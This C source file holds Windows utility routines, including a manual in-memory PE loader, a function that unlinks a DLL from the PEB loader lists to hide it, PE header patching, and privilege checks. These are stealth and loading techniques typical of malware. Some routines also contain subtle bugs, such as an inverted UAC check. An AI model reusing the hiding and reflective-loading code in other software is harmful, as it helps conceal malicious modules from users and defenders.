#include <intrin.h>
#include <windows.h>
#include <stdio.h>
#include <shlwapi.h>
#include <shlobj.h>
#include <imagehlp.h>

#include "ntdll.h"
#include "utils.h"

static UINT rand_val = 0;
UINT GetRand(UINT uMin, UINT uMax)
{
	if (!rand_val) rand_val = GetTickCount();
	rand_val = (rand_val * 214013L + 2531011L);

	return rand_val % (uMax - uMin + 1) + uMin;
}

PVOID GetMyBase()
{
	MEMORY_BASIC_INFORMATION MemoryBasicInfo;

	VirtualQuery(GetMyBase,&MemoryBasicInfo,sizeof(MemoryBasicInfo));

	return MemoryBasicInfo.AllocationBase;
}

#ifdef _DEBUG
VOID DbgPrint(PCHAR pcFormat,...)
{
	va_list vaList;
	CHAR chFormat[1024];
	CHAR chMsg[1024*4];
	CHAR chPath[MAX_PATH];

	GetModuleFileNameA(NULL,chPath,RTL_NUMBER_OF(chPath)-1);

	_snprintf(chFormat,sizeof(chFormat)-1,"[%s] %s",PathFindFileNameA(chPath),pcFormat);

	va_start(vaList,pcFormat);
	_vsnprintf(chMsg,sizeof(chMsg)-1,chFormat,vaList);
	va_end(vaList);

	OutputDebugString(chMsg);
}
#endif

char * __cdecl strdup(const char* c)
{
	size_t len = strlen(c);
	char* p = (char*)malloc(len+1);
	if (p)
	{
		strcpy(p,c);
		p[len] = 0;
	}
	return p;
}

void * __cdecl malloc(size_t sz)
{
	return HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,sz);
}

void __cdecl free(void * ptr)
{
	HeapFree(GetProcessHeap(),0,ptr);
}

void * __cdecl realloc(void * ptr,size_t new_size)
{
	return HeapReAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,ptr,new_size);
}

void * __cdecl operator new(size_t sz)
{
	return malloc(sz);
}

void * __cdecl operator new(size_t sz,void * ptr)
{
	return (ptr);
}

void __cdecl operator delete(void * ptr)
{
	free(ptr);
}

int __cdecl _purecall(void)
{
	return 0;
}

PVOID MapBinary(LPCSTR lpPath,DWORD dwFileAccess,DWORD dwFileFlags,DWORD dwPageAccess,DWORD dwMapAccess,PDWORD pdwSize)
{
	PVOID pMap = NULL;
	HANDLE hMapping;
	HANDLE hFile;

	hFile = CreateFile(lpPath,dwFileAccess,FILE_SHARE_READ,NULL,OPEN_EXISTING,dwFileFlags,0);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		hMapping = CreateFileMappingA(hFile,NULL,dwPageAccess,0,0,0);
		if (hMapping != INVALID_HANDLE_VALUE)
		{
			pMap = MapViewOfFile(hMapping,dwMapAccess,0,0,0);
			if (!pMap)
			{
				DbgPrint(__FUNCTION__"(): MapViewOfFile failed with error %x\n",GetLastError());
			}
			else if (pdwSize) *pdwSize = GetFileSize(hFile,NULL);

			CloseHandle(hMapping);
		}
		else
		{
			DbgPrint(__FUNCTION__"(): CreateFileMapping failed with error %x\n",GetLastError());
		}

		CloseHandle(hFile);
	}
	else
	{
		DbgPrint(__FUNCTION__"(): CreateFile failed with error %x\n",GetLastError());
	}

	return pMap;
}

BOOL SetFileDllFlag(LPCSTR lpPath)
{
	BOOL bRet = FALSE;
	PIMAGE_NT_HEADERS pNtHdr;
	DWORD dwFileSize;
	PVOID pMap;

	if (pMap = MapBinary(lpPath,FILE_ALL_ACCESS,FILE_FLAG_WRITE_THROUGH,PAGE_READWRITE,FILE_MAP_ALL_ACCESS,&dwFileSize))
	{
		if (pNtHdr = RtlImageNtHeader(pMap))
		{
			DWORD HeaderSum, CheckSum;

			pNtHdr->FileHeader.Characteristics |= IMAGE_FILE_DLL;

			if (CheckSumMappedFile(pMap,dwFileSize,&HeaderSum,&CheckSum))
			{
				pNtHdr->OptionalHeader.CheckSum = CheckSum;

				bRet = TRUE;
			}
		}

		FlushViewOfFile(pMap,dwFileSize);
		UnmapViewOfFile(pMap);
	}

	return bRet;
}

DWORD RvaToOffset(PIMAGE_NT_HEADERS pPE,DWORD dwRva)
{
	PIMAGE_SECTION_HEADER pSEC = IMAGE_FIRST_SECTION(pPE);

	for (WORD i = 0; i < pPE->FileHeader.NumberOfSections; i++)
	{
		if (dwRva >= pSEC->VirtualAddress && dwRva < (pSEC->VirtualAddress + pSEC->Misc.VirtualSize))
		{
			return dwRva + ALIGN_DOWN(pSEC->PointerToRawData,pPE->OptionalHeader.FileAlignment) - pSEC->VirtualAddress;
		}

		pSEC++;
	}

	return 0;
}
/*
PIMAGE_SECTION_HEADER SearchSection(PVOID pvPEBase,LPCSTR lpName)
{
	PIMAGE_NT_HEADERS pNtHeaders;

	pNtHeaders = RtlImageNtHeader(pvPEBase);
	if (pNtHeaders)
	{
		PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);

		for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
		{
			if (!strcmp(lpName,(PCHAR)&pSection->Name)) return pSection;

			pSection++;
		}
	}

	return 0;
}
*/
BOOL FileWrite(LPCSTR lpName,DWORD dwFlags,LPCVOID pvBuffer,DWORD dwSize)
{
	BOOL bRet = FALSE;
	HANDLE hFile;
	DWORD t;

	hFile = CreateFileA(lpName,GENERIC_WRITE,FILE_SHARE_READ,NULL,dwFlags,0,0);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		SetFilePointer(hFile,0,0,FILE_BEGIN);

		bRet = WriteFile(hFile,pvBuffer,dwSize,&t,0);

		FlushFileBuffers(hFile);

		SetEndOfFile(hFile);

		CloseHandle(hFile);
	}

	return bRet;
}

BOOL FileRead(LPCSTR lpFileName, PVOID *ppBuffer, DWORD *pdwSize)
{
	BOOL bRet = FALSE;
	HANDLE hFile;
	DWORD dwSize;
	DWORD dwReaded;

	hFile = CreateFileA(lpFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, 0);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		dwSize = GetFileSize(hFile, NULL);
		if (dwSize)
		{
			*ppBuffer = malloc(dwSize + 1);
			if (*ppBuffer)
			{
				bRet = ReadFile(hFile, *ppBuffer, dwSize, &dwReaded, NULL);
				*RVA_TO_VA(*ppBuffer, dwSize) = '\0';

				if (pdwSize) *pdwSize = dwSize;
				if (!bRet) free(*ppBuffer);
			}
		}

		CloseHandle(hFile);
	}

	return bRet;
}

BOOL CheckAdmin()
{
	BOOL Ret;
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	PSID AdministratorsGroup; 

	if (Ret = AllocateAndInitializeSid(&NtAuthority,2,SECURITY_BUILTIN_DOMAIN_RID,DOMAIN_ALIAS_RID_ADMINS,0,0,0,0,0,0,&AdministratorsGroup))
	{
		if (!CheckTokenMembership(NULL,AdministratorsGroup,&Ret))
		{
			Ret = FALSE;
		}

		FreeSid(AdministratorsGroup);
	}

	return Ret;
}

BOOL CheckUAC()
{
	BOOL fIsElevated = FALSE;
	HANDLE hToken = NULL;

	if (OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&hToken))
	{
		TOKEN_ELEVATION elevation;
		DWORD dwSize;

		if (GetTokenInformation(hToken,TokenElevation,&elevation,sizeof(elevation),&dwSize))
		{
			fIsElevated = !elevation.TokenIsElevated;
		}

		CloseHandle(hToken);
	}

	return fIsElevated;
}

BOOL CheckWow64()
{
	BOOL bIsWow64 = FALSE;
	typedef BOOL(WINAPI*LPFN_ISWOW64PROCESS)(HANDLE, PBOOL);
	LPFN_ISWOW64PROCESS fnIsWow64Process;

	fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(GetModuleHandleA("kernel32.dll"),"IsWow64Process");
	if (NULL != fnIsWow64Process)
	{
		fnIsWow64Process(GetCurrentProcess(),&bIsWow64);
	}

	return bIsWow64;
}

VOID FixDWORD(BYTE *Data,DWORD Size,DWORD Old,DWORD New)
{
	DWORD p = 0;
	PDWORD pDD;

	while (p < Size)
	{
		pDD = (PDWORD)(Data + p);
		if (*pDD == Old) *(DWORD*)(Data + p) = New;

		p++;
	}
}

VOID HideDllPeb(LPCSTR lpDllName)
{
	PLDR_DATA_TABLE_ENTRY pldteDllEntry;
	PLIST_ENTRY pleCurrentDll;
	PLIST_ENTRY pleHeadDll;
	PPEB_LDR_DATA ppldLoaderData;
	PPEB ppPEB = (PPEB)__readfsdword(0x30);

	ppldLoaderData = ppPEB->Ldr;
	if (ppldLoaderData)
	{
		pleHeadDll = &ppldLoaderData->InLoadOrderModuleList;
		pleCurrentDll = pleHeadDll;
		while (pleCurrentDll && (pleHeadDll != (pleCurrentDll = pleCurrentDll->Flink)))
		{
			pldteDllEntry = CONTAINING_RECORD(pleCurrentDll,LDR_DATA_TABLE_ENTRY,InLoadOrderModuleList);			
			if (pldteDllEntry && pldteDllEntry->Flags & 0x00000004)
			{
				CHAR Buffer[MAX_PATH];
				ANSI_STRING as = RTL_CONSTANT_STRING(Buffer);

				RtlUnicodeStringToAnsiString(&as,&pldteDllEntry->BaseDllName,FALSE);
				if (StrStrIA(Buffer,lpDllName))
				{
					DbgPrint(__FUNCTION__"(): Dll '%s' removed from loader data\n",lpDllName);

					RemoveEntryList(&pldteDllEntry->InLoadOrderModuleList);
					RemoveEntryList(&pldteDllEntry->InInitializationOrderModuleList);
					RemoveEntryList(&pldteDllEntry->InMemoryOrderModuleList);
					RemoveEntryList(&pldteDllEntry->HashLinks);
				}
			}
		}
	}
}	

PVOID GetSystemInformation(SYSTEMINFOCLASS InfoClass)
{
	NTSTATUS St;
	PVOID Buffer;
	DWORD Size = 0x1000*4;
	DWORD t;

	do
	{
		Buffer = malloc(Size);
		if (!Buffer) return NULL;

		St = NtQuerySystemInformation(InfoClass,Buffer,Size,&t);
		if (!NT_SUCCESS(St)) 
		{
			free(Buffer);
			Buffer = NULL;
			Size += 0x1000*4;
		}
	}
	while (St == STATUS_INFO_LENGTH_MISMATCH);

	if (!NT_SUCCESS(St))
	{
		DbgPrint(__FUNCTION__"(): NtQuerySystemInformation failed with status %lx\n",St);
	}

	return Buffer;
}

DWORD CreateThreadAndWait(PVOID pvProc,PVOID pvContext,DWORD dwWait)
{
	DWORD dwExitCode = 0;

	HANDLE hThread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)pvProc,pvContext,0,NULL);
	if (hThread)
	{
		if (WaitForSingleObject(hThread,dwWait) == WAIT_OBJECT_0)
		{
			GetExitCodeThread(hThread,&dwExitCode);
		}

		CloseHandle(hThread);
	}

	return dwExitCode;
}

PCHAR StrNCopy(PCHAR pcStr,DWORD dwLen)
{
	PCHAR pcResult;

	if (dwLen)
	{
		pcResult = (PCHAR)malloc(dwLen+1);
		if (pcResult)
		{
			RtlCopyMemory(pcResult,pcStr,dwLen);

			pcResult[dwLen] = 0;
		}
	}

	return pcResult;
}

PCHAR StrCopy(PCHAR pcStr)
{
	return StrNCopy(pcStr,strlen(pcStr));
}

DWORD FindStrInStr(PCHAR pcStr1,DWORD dwLen1,PCHAR pcStr2,DWORD dwLen2)
{
	if (dwLen1 >= dwLen2)
	{
		for (DWORD dwCnt = 0; dwCnt < dwLen1; dwCnt++)
		{
			for (DWORD dwPos1 = dwCnt,dwPos2 = 0; dwPos1 < dwLen1; dwPos1++)
			{
				if (tolower(pcStr1[dwPos1]) !=  tolower(pcStr2[dwPos2]))
				{
					break;
				}

				++dwPos2;
				if (dwPos2 == dwLen2) return dwPos1 - dwLen2 + 1;
			}
		}
	}

	return -1;
}

PCHAR GetStrValueStr(PCHAR pcBuffer,DWORD dwBufferLen,PCHAR pcStr,DWORD dwStrLen,PCHAR pcSep)
{
	DWORD dwLen;
	DWORD dwPos;

	dwPos = FindStrInStr(pcBuffer,dwBufferLen,pcStr,dwStrLen);
	if (dwPos != -1)
	{
		dwPos += dwStrLen;
		if (pcBuffer[dwPos] == ' ') ++dwPos;

		if (pcSep)
		{
			dwLen = FindStrInStr(pcBuffer+dwPos,dwBufferLen-dwPos,pcSep,strlen(pcSep));
			if (dwLen == -1) dwLen = 0;
		}
		else
		{
			dwLen = dwBufferLen - dwPos;
		}

		if (dwLen) return StrNCopy(pcBuffer + dwPos,dwLen);
	}

	return NULL;
}

unsigned long Crc32(const unsigned char * buf, unsigned long len)
{
	unsigned long crc_table[256];
	unsigned long crc;

	for (int i = 0; i < 256; i++)
	{
		crc = i;
		for (int j = 0; j < 8; j++)
			crc = crc & 1 ? (crc >> 1) ^ 0xEDB88320UL : crc >> 1;

		crc_table[i] = crc;
	};

	crc = 0xFFFFFFFFUL;

	while (len--) 
		crc = crc_table[(crc ^ *buf++) & 0xFF] ^ (crc >> 8);

	return crc ^ 0xFFFFFFFFUL;
}

static LONG DeleteRegKeyRecursive_q(HKEY RootKey,LPCSTR lpSubKey,LONG Level)
{
	HKEY hKey;

	if (ERROR_SUCCESS == RegOpenKeyExA(RootKey,lpSubKey,0,KEY_ALL_ACCESS,&hKey))
	{
		CHAR szSubKey[MAX_PATH];

		while (ERROR_SUCCESS == RegEnumKeyA(hKey,0,szSubKey,sizeof(szSubKey)))
		{
			if (ERROR_SUCCESS != DeleteRegKeyRecursive_q(hKey,szSubKey,Level+1)) break;
		}

		RegCloseKey(hKey);
	}

	return RegDeleteKeyA(RootKey,lpSubKey);
}

LONG DeleteRegKeyRecursive(HKEY RootKey,LPCSTR lpSubKey)
{
	return DeleteRegKeyRecursive_q(RootKey,lpSubKey,0);
}

BOOL ProcessRelocs(PVOID pvImageBase, DWORD dwDelta)
{
	DWORD dwRelocsSize;
	PIMAGE_BASE_RELOCATION pReloc;

	if (dwDelta)
	{
		pReloc = (PIMAGE_BASE_RELOCATION)RtlImageDirectoryEntryToData(pvImageBase, TRUE, IMAGE_DIRECTORY_ENTRY_BASERELOC, &dwRelocsSize);
		if (pReloc && dwRelocsSize)
		{
			PIMAGE_BASE_RELOCATION pEndReloc = (PIMAGE_BASE_RELOCATION)(pReloc + dwRelocsSize);

			while (pReloc->SizeOfBlock && pReloc < pEndReloc)
			{
				pReloc = LdrProcessRelocationBlock(MAKE_PTR(pvImageBase, pReloc->VirtualAddress, ULONG_PTR), (pReloc->SizeOfBlock - sizeof(*pReloc))/sizeof(USHORT), (PUSHORT)(pReloc + 1), dwDelta);
				if (!pReloc) return FALSE;
			}
		}
	}

	return TRUE;
}

BOOLEAN ProcessImport(PVOID pvImageBase)
{
	DWORD dwImportSize;
	PIMAGE_IMPORT_DESCRIPTOR pImport;

	pImport = (PIMAGE_IMPORT_DESCRIPTOR)RtlImageDirectoryEntryToData(pvImageBase, TRUE, IMAGE_DIRECTORY_ENTRY_IMPORT, &dwImportSize);
	if (pImport && dwImportSize)
	{
		for (; pImport->Name; pImport++)
		{
			PCHAR szDllName = RVA_TO_VA(pvImageBase, pImport->Name);
			HMODULE hDll = LoadLibraryA(szDllName);
			if (!hDll) return FALSE;

			PDWORD thunkRef, funcRef;

			if (pImport->OriginalFirstThunk)
			{
				thunkRef = MAKE_PTR(pvImageBase, pImport->OriginalFirstThunk, PDWORD); 
				funcRef = MAKE_PTR(pvImageBase, pImport->FirstThunk, PDWORD);
			}
			else
			{
				thunkRef = MAKE_PTR(pvImageBase, pImport->FirstThunk, PDWORD); 
				funcRef = MAKE_PTR(pvImageBase, pImport->FirstThunk , PDWORD);      
			}

			for (; *thunkRef; thunkRef++, funcRef++)
			{
				PVOID pvProcAddress;

				if (IMAGE_SNAP_BY_ORDINAL(*thunkRef))
				{
					pvProcAddress = GetProcAddress(hDll, (PCHAR)IMAGE_ORDINAL(*thunkRef));
				}
				else
				{
					pvProcAddress = GetProcAddress(hDll, (PCHAR)&((PIMAGE_IMPORT_BY_NAME)RVA_TO_VA(pvImageBase, *thunkRef))->Name);
				}
				if (!pvProcAddress) return FALSE;

				*(PVOID*)funcRef = pvProcAddress;
			}
		}
	}

	return TRUE;
}

BOOL LoadImageFromMemory(PVOID pBuffer, PVOID *ppImage)
{
	BOOL Ret = FALSE;
	PIMAGE_NT_HEADERS pNtHeader;
	PVOID pImage;
	PIMAGE_SECTION_HEADER pSection;

	pNtHeader = RtlImageNtHeader(pBuffer);
	if (pNtHeader)
	{
		pImage = VirtualAlloc(NULL, pNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (pImage)
		{
			pSection = IMAGE_FIRST_SECTION(pNtHeader);
			RtlCopyMemory(pImage, pBuffer, pSection->PointerToRawData);

			for (WORD i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++)
			{
				RtlCopyMemory(RVA_TO_VA(pImage,pSection[i].VirtualAddress), RVA_TO_VA(pBuffer,pSection[i].PointerToRawData), pSection[i].SizeOfRawData);
			}

			if (ProcessImport(pImage))
			{
				if (ProcessRelocs(pImage, VA_TO_RVA(pNtHeader->OptionalHeader.ImageBase, pImage)))
				{
					Ret = TRUE;
				}
			}

			if (Ret)
			{
				typedef BOOLEAN (WINAPI *PDLL_ENTRY_POINT)(PVOID, DWORD, DWORD);
				PDLL_ENTRY_POINT pDllEntryPoint = MAKE_PTR(pImage, pNtHeader->OptionalHeader.AddressOfEntryPoint, PDLL_ENTRY_POINT);

				if (!pDllEntryPoint(pImage, DLL_PROCESS_ATTACH, 0))
				{
					Ret = FALSE;
				}
				else
				{
					if (ppImage) *ppImage = pImage;
				}
			}

			if (!Ret) VirtualFree(pImage, 0, MEM_RELEASE);
		}
	}

	return Ret;
}

PVOID GetExportEntry(PVOID ModuleBase, LPCSTR lpProcName)
{
	PIMAGE_NT_HEADERS pNtHeaders;
	PIMAGE_EXPORT_DIRECTORY pImageExport;
	DWORD dwExportSize;

	pNtHeaders = (PIMAGE_NT_HEADERS)RtlImageNtHeader(ModuleBase);
	if (pNtHeaders)
	{
		pImageExport = (PIMAGE_EXPORT_DIRECTORY)RtlImageDirectoryEntryToData(ModuleBase,TRUE,IMAGE_DIRECTORY_ENTRY_EXPORT,&dwExportSize);
		if (pImageExport)
		{
			PDWORD pAddrOfNames = MAKE_PTR(ModuleBase, pImageExport->AddressOfNames, PDWORD);
			for (DWORD i = 0; i < pImageExport->NumberOfNames; i++)
			{
				if (!strcmp(RVA_TO_VA(ModuleBase, pAddrOfNames[i]), lpProcName))
				{
					PDWORD pAddrOfFunctions = MAKE_PTR(ModuleBase, pImageExport->AddressOfFunctions, PDWORD);
					PWORD pAddrOfOrdinals = MAKE_PTR(ModuleBase, pImageExport->AddressOfNameOrdinals, PWORD);

					return RVA_TO_VA(ModuleBase, pAddrOfFunctions[pAddrOfOrdinals[i]]);
				}
			}
		}
	}

	return NULL;
}